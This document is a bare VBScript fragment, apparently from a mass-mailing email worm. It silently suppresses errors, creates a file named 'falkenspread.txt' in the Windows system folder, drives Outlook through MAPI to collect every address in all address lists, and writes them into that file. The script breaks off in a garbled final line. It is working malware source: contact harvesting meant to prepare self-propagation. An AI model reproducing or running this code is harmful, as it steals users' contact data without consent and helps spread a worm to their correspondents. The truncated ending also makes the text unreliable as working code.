On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set sys=fs.GetSpecialFolder(1)
Set c=fs.CreateTextFile(sys&"\falkenspread.txt")
c.Close
Set ou=CreateObject("Outlook.Application")
Set map=ou.GetNameSpace("MAPI")
adr=""
For Each mel in map.AddressLists
If mel.AddressEntries.Count <> 0 Then
For O=1 To mel.AddressEntries.Count
adr=adr &";"& mel.AddressEntries(O).Address
Next
End If
Next
adr=adr &";#"

Set c=fs.OpenTextFile(sys&"\falkenspread.txt",2)
c.WriteLine adr
c.Close
mailto : > 
